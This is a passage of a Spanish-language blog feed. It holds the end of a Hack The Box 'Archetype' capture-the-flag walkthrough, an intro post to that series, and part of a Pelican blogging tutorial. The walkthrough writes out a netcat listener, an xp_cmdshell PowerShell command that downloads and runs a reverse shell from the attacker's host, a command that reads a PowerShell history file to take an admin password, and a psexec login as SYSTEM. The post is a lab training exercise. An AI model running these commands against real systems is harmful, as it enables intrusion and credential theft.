+    &lt;span class="nv"&gt;$stream&lt;/span&gt;.Flush&lt;span class="o"&gt;()}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$client&lt;/span&gt;.Close&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si observamos, estamos viendo que se crea una conexión a la &lt;span class="caps"&gt;IP&lt;/span&gt; y el puerto
+especificado, se crea un stream de datos y a partir de aquí se codifica la
+información para poder enviarla a través de la conexión a una terminal&amp;nbsp;remota.&lt;/p&gt;
+&lt;p&gt;Recuerden cambiar la dirección &lt;span class="caps"&gt;IP&lt;/span&gt; al de su equipo. Si no conoces tu dirección
+puedes utilizar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ip addr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Con la &lt;span class="caps"&gt;IP&lt;/span&gt; indicada y el archivo creado, desde la terminal nos dirigimos a la
+carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
+nuestro equipo al servidor &lt;code&gt;SQL&lt;/code&gt; donde nos conectamos para poder ejecutarlo ahí
+y crear la reverse&amp;nbsp;shell.&lt;/p&gt;
+&lt;p&gt;Para esto, vamos a hacer los siguientes&amp;nbsp;pasos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Levantaremos un servidor &lt;code&gt;HTTP&lt;/code&gt; del cual descargaremos el&amp;nbsp;archivo&lt;/li&gt;
+&lt;li&gt;Configuramos los puertos de escucha para nuestra conexión de la reverse&amp;nbsp;shell&lt;/li&gt;
+&lt;li&gt;Configuraremos el firewall para aceptar las dos conexiones&amp;nbsp;anteriores&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;El primer punto lo haremos utilizando el interprete de &lt;code&gt;python&lt;/code&gt;, con el cual
+podemos utilizar la clase &lt;code&gt;http.server&lt;/code&gt; e indicarle el puerto de escucha.
+Recuerda que necesitar estar en la carpeta donde guardaste el archivo &lt;code&gt;shell.ps1&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 -m http.server &lt;span class="m"&gt;80&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El segundo punto lo podemos hacer utilizando &lt;a href="https://en.wikipedia.org/wiki/Netcat"&gt;netcat&lt;/a&gt;
+la cual es una herramienta para leer o escribir conexiones de red sobre &lt;span class="caps"&gt;TCP&lt;/span&gt; o &lt;span class="caps"&gt;UDP&lt;/span&gt;.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -lvnp &lt;span class="m"&gt;443&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Los parámetros de &lt;code&gt;netcat&lt;/code&gt; son los&amp;nbsp;siguientes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;l&lt;/code&gt;: modo de escucha, para conexiones&amp;nbsp;entrantes&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: modo &lt;code&gt;verbose&lt;/code&gt;, para ir viendo que&amp;nbsp;sucede&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;n&lt;/code&gt;: para trabajar con direcciones &lt;span class="caps"&gt;IP&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p&lt;/code&gt;: para indicar el puerto donde estará escuchando la conexión, que es el&amp;nbsp;443&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Para el tercer punto utilizaremos &lt;a href="https://wiki.debian.org/Uncomplicated%20Firewall%20%28ufw%29"&gt;ufw&lt;/a&gt;
+el cual es un firewall con el que vamos a gestionar los&amp;nbsp;puertos.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ufw allow from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 proto tcp to any port &lt;span class="m"&gt;80&lt;/span&gt;,443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Con sus comando estamos indicando que permita (&lt;code&gt;allow&lt;/code&gt;) conexiones desde (&lt;code&gt;from&lt;/code&gt;)
+la dirección &lt;span class="caps"&gt;IP&lt;/span&gt; &lt;code&gt;10.10.10.27&lt;/code&gt; que es la que estamos atacando mediante el protocolo
+&lt;code&gt;TCP&lt;/code&gt; (&lt;code&gt;proto tcp&lt;/code&gt;) a los puertos 80 y 443 (&lt;code&gt;to any port 80,443&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Ahora, regresemos a nuestra terminal de &lt;code&gt;SQL&lt;/code&gt;, ahi vamos a utilizar la herramienta
+&lt;code&gt;xp_cmdshell&lt;/code&gt; que utilizamos previamente, ahora invocaremos una conexión a nuestro
+servidor &lt;code&gt;HTTP&lt;/code&gt; local que nos permita descargar la reverse shell y ejecutarla.
+Al ejecutar la reverse shell se creara una conexión a nuestro equipo que sera
+aceptada por &lt;code&gt;netcat&lt;/code&gt; y desde ahi ya podremos utilizar la reverse&amp;nbsp;shell.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;xp_cmdshell &lt;span class="s2"&gt;&amp;quot;powershell &amp;quot;&lt;/span&gt;IEX &lt;span class="o"&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class="o"&gt;)&lt;/span&gt;.DownloadString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;http://10.10.14.3/shell.ps1&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Recuerda actualizar tu dirección &lt;span class="caps"&gt;IP&lt;/span&gt; en el comando&amp;nbsp;anterior.&lt;/p&gt;
+&lt;p&gt;Ya tenemos una reverse shell al usuario en &lt;code&gt;Windows&lt;/code&gt;, podemos proceder a extraer
+la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
+con el comando &lt;code&gt;cd&lt;/code&gt; e indicar la&amp;nbsp;ruta.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cd C:\Users\sql_svc\Desktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Aquí podemos ver que se encuentra el archivo &lt;code&gt;user.txt&lt;/code&gt; el cual contiene la&amp;nbsp;bandera.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# dir
+
+
+    Directory: C:\Users\sql_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le podemos aplicar un &lt;code&gt;type&lt;/code&gt; o un &lt;code&gt;cat&lt;/code&gt; al archivo y listo! Tenemos la primer&amp;nbsp;bandera.&lt;/p&gt;
+&lt;h2&gt;Privilege&amp;nbsp;Escalation&lt;/h2&gt;
+&lt;p&gt;Ya obtuvimos la bandera a nivel de usuario, ahora necesitamos obtener la bandera
+a nivel&amp;nbsp;administrador.&lt;/p&gt;
+&lt;p&gt;Sabemos que la cuenta en la que nos encontramos no tiene permisos de administrador
+pero que se utiliza como una cuenta para gestionar servicios, esto significa
+que en algún momento cuando se levantan los servicios se aplica algún permiso
+de administrador. Para conocer en que momento sucede podemos revisar el historial
+de comandos de &lt;code&gt;PowerShell&lt;/code&gt;. Para esto podemos utilizar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;type&lt;/span&gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\s&lt;/span&gt;ql_svc&lt;span class="se"&gt;\A&lt;/span&gt;ppData&lt;span class="se"&gt;\R&lt;/span&gt;oaming&lt;span class="se"&gt;\M&lt;/span&gt;icrosoft&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\P&lt;/span&gt;owerShell&lt;span class="se"&gt;\P&lt;/span&gt;SReadline&lt;span class="se"&gt;\C&lt;/span&gt;onsoleHost_history.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La salida del comando anterior nos muestra lo&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.exe use T: &lt;span class="se"&gt;\\&lt;/span&gt;Archetype&lt;span class="se"&gt;\b&lt;/span&gt;ackups /user:administrator MEGACORP_4dm1n!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Con lo anterior podemos observar que el disco &lt;code&gt;backups&lt;/code&gt; que encontramos al
+conectarnos por &lt;code&gt;SMB&lt;/code&gt; fue mapeado con una cuenta local de administrador, y
+ahora tenemos su&amp;nbsp;contraseña.&lt;/p&gt;
+&lt;p&gt;Para conectarnos utlizaremos una versión de &lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"&gt;PsExec&lt;/a&gt; incluida en &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;De igual manera que el comando de &lt;code&gt;mssqlclient&lt;/code&gt; lo invocaremos a traves del
+interprete de &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 psexec.py administrator@10.10.10.27
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
+es satisfactoria, de tal modo que tenemos una terminal con permisos de&amp;nbsp;administrador.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Impacket v0.9.21 - Copyright &lt;span class="m"&gt;2020&lt;/span&gt; SecureAuth Corporation
+
+Password:
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Requesting shares on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Found writable share ADMIN$
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Uploading file jcWXyjRG.exe
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Opening SVCManager on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Creating service UFMW on &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27.....
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting service UFMW.....
+&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Press &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; extra shell commands
+Microsoft Windows &lt;span class="o"&gt;[&lt;/span&gt;Version &lt;span class="m"&gt;10&lt;/span&gt;.0.17763.107&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; Microsoft Corporation. All rights reserved.
+
+C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Verificamos nuestros&amp;nbsp;permisos:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class="se"&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
+del administrador y extraer la última&amp;nbsp;bandera.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;cd C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;dir
+ Volume &lt;span class="k"&gt;in&lt;/span&gt; drive C has no label.
+ Volume Serial Number is CE13-2325
+
+ Directory of C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+
+&lt;span class="m"&gt;01&lt;/span&gt;/20/2020  &lt;span class="m"&gt;05&lt;/span&gt;:42 AM    &amp;lt;DIR&amp;gt;          .
+&lt;span class="m"&gt;01&lt;/span&gt;/20/2020  &lt;span class="m"&gt;05&lt;/span&gt;:42 AM    &amp;lt;DIR&amp;gt;          ..
+&lt;span class="m"&gt;02&lt;/span&gt;/25/2020  &lt;span class="m"&gt;06&lt;/span&gt;:36 AM                &lt;span class="m"&gt;32&lt;/span&gt; root.txt
+               &lt;span class="m"&gt;1&lt;/span&gt; File&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;             &lt;span class="m"&gt;32&lt;/span&gt; bytes
+               &lt;span class="m"&gt;2&lt;/span&gt; Dir&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;  &lt;span class="m"&gt;33&lt;/span&gt;,818,599,424 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;dministrator&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Listo! Tenemos las dos banderas de esta&amp;nbsp;máquina!&lt;/p&gt;
+&lt;h2&gt;Fin&lt;/h2&gt;
+&lt;p&gt;Bueno, con eso hemos concluido la revisión del primer walk-through de las
+máquinas de introducción de &lt;code&gt;HTB&lt;/code&gt;. Este texto fue un poco más extenso ya que se
+fueron expllicando paso a paso cada comando, pero conforme avancemos en las
+herramientas y comandos obviaremos los que se hayan explicado&amp;nbsp;previamente.&lt;/p&gt;
+&lt;p&gt;Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
+estos temas de seguridad, &lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"&gt;recuerda no rendirte&lt;/a&gt;
+y seguir aprendiendo poco a&amp;nbsp;poco.&lt;/p&gt;
+&lt;p&gt;Nos vemos en el siguiente texto.&amp;nbsp;Ciao!&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#HappyHacking&lt;/code&gt;&lt;/p&gt;</content><category term="htb"></category><category term="cybersecurity"></category><category term="htb"></category><category term="pentest"></category><category term="writeup"></category></entry><entry><title>Hack-The-Box (0001) &gt; Starting Point</title><link href="https://penserbjorne.com/hack-the-box-0001-starting-point-es-MX.html" rel="alternate"></link><published>2020-08-06T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-06:/hack-the-box-0001-starting-point-es-MX.html</id><summary type="html">&lt;p&gt;Anotaciones sobre la sección &amp;#8220;Starting point&amp;#8221; de&amp;nbsp;Hack-The-Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;This is not the intro&amp;nbsp;:)&lt;/h2&gt;
+&lt;p&gt;Ola k&amp;nbsp;ase.&lt;/p&gt;
+&lt;p&gt;Para este exacto momento en el que escribo esta linea de texto han pasado 146
+días desde que comenzó la pandemia del &lt;span class="caps"&gt;COVID&lt;/span&gt;-19 y pareciera que el tiempo se
+detuvo y que no ha pasado nada pero que a la vez que han pasado tantas&amp;nbsp;cosas.&lt;/p&gt;
+&lt;p&gt;Como sea, este blog esta en la misma situación, un tiempo&amp;nbsp;suspendido.&lt;/p&gt;
+&lt;p&gt;Dependiendo de cual futuro o universo paralelo leas esto puede que el blog
+ni siquiera este terminado de configurar, que aún tenga el template de &lt;code&gt;Pelican&lt;/code&gt;
+y que no tenga nada de contenido o que ya sea un pequeño blog que se ve hermoso
+y tiene un par de entradas útiles para la humanidad haha en todo caso, si en
+estos dos párrafos no te haz aburrido o retirado, mandame un tuit a
+&lt;a href="https://twitter.com/_penserbjorne"&gt;@_penserbjorne&lt;/a&gt;
+con una captura de pantalla de como se ve el blog y a cambio te invito unos
+taquitos&amp;nbsp;:)&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Personas hermosas que han reclamado sus&amp;nbsp;tacos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://twitter.com/brendorts/status/1291595727693651969"&gt;Brendita&lt;/a&gt;, aunque elimino esa&amp;nbsp;cuenta.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Ahora sí,&amp;nbsp;arranquemos.&lt;/p&gt;
+&lt;h2&gt;Hack-The-Box: Starting&amp;nbsp;point&lt;/h2&gt;
+&lt;h3&gt;¿Qué es&amp;nbsp;esto?&lt;/h3&gt;
+&lt;p&gt;Estos textos serán anotaciones sobre la sección &lt;strong&gt;Starting point&lt;/strong&gt; de
+&lt;strong&gt;Hack-The-Box&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Nos apoyaremos en los walk-throughs que ya vienen incorporados en la sección
+&lt;em&gt;Starting point&lt;/em&gt; e iremos explicando los comandos&amp;nbsp;utilizados.&lt;/p&gt;
+&lt;h3&gt;Hack-The-Box (&lt;span class="caps"&gt;HTB&lt;/span&gt;)&lt;/h3&gt;
+&lt;p&gt;Bueno, para hablar de &lt;a href="https://www.hackthebox.eu"&gt;&lt;strong&gt;Hack-The-Box&lt;/strong&gt; (&lt;span class="caps"&gt;HTB&lt;/span&gt;)&lt;/a&gt; y
+presentar lo qué realmente es este proyecto seria bueno dedicar una entrada
+específicamente a eso, por lo cual solo diré que es una plataforma para
+practicar o probar tus habilidades de pentesting trabajando sobre maquinas
+virtuales que están diseñadas y preparadas para&amp;nbsp;esto.&lt;/p&gt;
+&lt;p&gt;En resumen, hay maquinas virtuales con cierto software instalado y ciertas
+configuraciones que permiten que esta maquina pueda ser vulnerada de alguna
+manera. ¿Quieres practicar temas de pentesting? Esta es una de las plataformas&amp;nbsp;recomendadas.&lt;/p&gt;
+&lt;h3&gt;Starting&amp;nbsp;Point&lt;/h3&gt;
+&lt;p&gt;Para las personas que van comenzando en este ámbito puede que &lt;span class="caps"&gt;HTB&lt;/span&gt; sea una
+plataforma con un nivel de complejidad bastante alto y no necesariamente la
+primera opción para&amp;nbsp;arrancar.&lt;/p&gt;
+&lt;p&gt;Para solucionar esto &lt;span class="caps"&gt;HTB&lt;/span&gt; ha habilitado una sección llamada
+&lt;a href="https://www.hackthebox.eu/home/start"&gt;&lt;strong&gt;Starting Point&lt;/strong&gt;&lt;/a&gt;
+en la cual se encuentran una serie de maquinas con un nivel &lt;em&gt;básico&lt;/em&gt;
+acompañadas de sus &lt;a href="https://www.wordnik.com/words/walk-through"&gt;walk-throughs&lt;/a&gt;
+para que puedas resolverlas y familiarizarte con los pasos usuales del proceso
+de&amp;nbsp;pentesting.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nota&lt;/strong&gt;: El pentesting no es una receta, estos recursos son solo para
+comenzar, pero conforme se avanza es necesario refinar tus habilidades y hacer
+uso el conocimiento que vas desarrollando o acumulando&amp;nbsp;:)&lt;/p&gt;
+&lt;h2&gt;Elementos del&amp;nbsp;pentesting&lt;/h2&gt;
+&lt;p&gt;Si bien el pentesting no es una receta, existen diferentes metodologías o
+frameworks que nos ayudan a guiarnos para realizar esta actividad de manera
+ordenada y&amp;nbsp;limpia.&lt;/p&gt;
+&lt;p&gt;Si quieres saber más puedes buscar los siguientes términos en&amp;nbsp;Internet:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Cyber security&amp;nbsp;framework&lt;/li&gt;
+&lt;li&gt;Cyber security kill&amp;nbsp;chain&lt;/li&gt;
+&lt;li&gt;&lt;span class="caps"&gt;MITRE&lt;/span&gt;&amp;nbsp;Framework&lt;/li&gt;
+&lt;li&gt;&lt;span class="caps"&gt;OWASP&lt;/span&gt;&amp;nbsp;Framework&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Listo, ahora que haz ignorado lo anterior o haz regresado de buscar, en el caso
+de la sección de &lt;strong&gt;Starting Point&lt;/strong&gt; de &lt;span class="caps"&gt;HTB&lt;/span&gt; podemos encontrar de manera general
+los siguiente&amp;nbsp;elementos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Reconocimiento&amp;nbsp;(Reconnaissance)&lt;/li&gt;
+&lt;li&gt;Enumeración&amp;nbsp;(Enumeration)&lt;/li&gt;
+&lt;li&gt;Punto de partida&amp;nbsp;(Foothold)&lt;/li&gt;
+&lt;li&gt;Movimiento lateral (Lateral&amp;nbsp;Movement)&lt;/li&gt;
+&lt;li&gt;Explotación&amp;nbsp;(Explotation)&lt;/li&gt;
+&lt;li&gt;Escalada de privilegios (Privilege&amp;nbsp;Escalation)&lt;/li&gt;
+&lt;li&gt;Explotación posterior (Post&amp;nbsp;Explotation)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Si bien no todas las máquinas necesitan todos los pasos mencionados, es bueno
+tenerlos presentes para tratar de trabajar de manera&amp;nbsp;ordenada.&lt;/p&gt;
+&lt;p&gt;Te recomendamos resolver cada maquina con su walk-through y a la par ir leyendo
+esta serie de&amp;nbsp;textos.&lt;/p&gt;
+&lt;h2&gt;Anotaciones de Starting&amp;nbsp;point&lt;/h2&gt;
+&lt;p&gt;Para ir tomando nota iremos creando una sección por cada maquina e iremos
+desarrollando los comando que solicita su walk-through correspondiente y le
+daremos contexto al comando o a la&amp;nbsp;acción.&lt;/p&gt;
+&lt;p&gt;Debido a que no sé cual va a ser la longitud de cada maquina lo mejor será
+dedicar una entrada a cada una por lo que te invito pases a la siguiente entrada
+en la cual comenzaremos con la maquina
+&lt;a href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html"&gt;&lt;strong&gt;Archetype&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;#HappyHacking&lt;/code&gt;&lt;/p&gt;</content><category term="htb"></category><category term="init"></category><category term="cybersecurity"></category><category term="htb"></category><category term="pentest"></category><category term="writeup"></category></entry><entry><title>Pelican (02), creación de entradas para un blog estático con Pelican</title><link href="https://penserbjorne.com/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html" rel="alternate"></link><published>2020-05-09T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-05-09:/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html</id><summary type="html">&lt;p&gt;Creación de entradas para un blog estático con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is&amp;nbsp;this?&lt;/h2&gt;
+&lt;p&gt;Weno weno, ¿de que va esta entrada? Pues de cómo escribir contenido (entradas)
+en el blog con &lt;code&gt;Pelican&lt;/code&gt;. Esto es continuación de la
+&lt;a href="https://penserbjorne.com/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html"&gt;entrada anterior&lt;/a&gt; en la cual vimos una ligera
+introducción a &lt;code&gt;Pelican&lt;/code&gt;, cómo instalarlo y como ejecutarlo para ver andando el
+sitio. Básicamente, un pequeño &lt;strong&gt;hola mundo&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Como ya hemos dicho, toda la documentación necesaria (y extendida) se
+encuentra en &lt;a href="https://docs.getpelican.com"&gt;el blog oficial de Pelican&lt;/a&gt;, por lo
+que si se necesita mayor información o detalle de algo pues &amp;#8230; a visitar el
+sitio&amp;nbsp;oficial.&lt;/p&gt;
+&lt;h2&gt;Markdown&lt;/h2&gt;
+&lt;p&gt;Una de las razones por las cuales elegimos &lt;code&gt;Pelican&lt;/code&gt; como herramienta para
+escribir el blog es que tiene soporte para &lt;code&gt;Markdown&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Markdown&lt;/code&gt; a grandes rasgos es un lenguaje de marcado ligero, esto significa que
+se escribe texto plano utilizando etiquetas que posteriormente serán convertidas
+a un formato más bonito, en este caso &lt;span class="caps"&gt;HTML&lt;/span&gt;.&lt;/p&gt;
+&lt;p&gt;La ventaja de utilizar &lt;code&gt;Markdown&lt;/code&gt; es que podemos enfocarnos simplemente en
+escribir utilizando cualquier editor de texto sabiendo que las etiquetas que
+estamos utilizando tendrán un formato agradable de&amp;nbsp;leer.&lt;/p&gt;
+&lt;p&gt;Si quieres aprender un poco más sobre &lt;code&gt;Markdown&lt;/code&gt; te dejo su &lt;a href="https://es.wikipedia.org/wiki/Markdown"&gt;entrada de
+&lt;code&gt;Wikipedia&lt;/code&gt;&lt;/a&gt;,
+&lt;a href="https://daringfireball.net/projects/markdown/"&gt;el sitio original de su publicación&lt;/a&gt;
+y una &lt;a href="https://markdown.es/sintaxis-markdown/"&gt;sheetcheat de sus etiquetas&lt;/a&gt;
+para que veas lo sencillo que&amp;nbsp;es.&lt;/p&gt;
+&lt;p&gt;En este caso, la extensión del archivo &lt;code&gt;Markdown&lt;/code&gt; que estaremos utilizando es
+&lt;code&gt;.md&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;¿Donde vamos a&amp;nbsp;escribir?&lt;/h2&gt;
+&lt;p&gt;Recordando la estructura del sitio, sabemos que las entradas del mismo
+van en la carpeta &lt;code&gt;content&lt;/code&gt; de nuestra subcarpeta &lt;code&gt;pelican&lt;/code&gt;. Ahí es donde
+podremos comenzar a crear nuestros archivos en &lt;code&gt;Markdown&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/path/to/project
+├── bin/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── include/      &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── lib/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── local/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── share/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+└── user.github.io/   &lt;span class="c1"&gt;# carpeta del repositorio del sitio&lt;/span&gt;
+    └── pelican/      &lt;span class="c1"&gt;# carpeta con los archivos fuente del sitio&lt;/span&gt;
+        ├── content   &lt;span class="c1"&gt;# Archivos en Markdown&lt;/span&gt;
+        │   └── &lt;span class="o"&gt;(&lt;/span&gt;pages&lt;span class="o"&gt;)&lt;/span&gt;
+        ├── output
+        ├── tasks.py
+        ├── Makefile
+        ├── pelicanconf.py
+        └── publishconf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo que para añadir una nueva entrada bastará con crear un archivo nuevo en
+la carpeta &lt;code&gt;content&lt;/code&gt; con la extensión &lt;code&gt;.md&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/path/to/project
+├── bin/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── include/      &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── lib/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
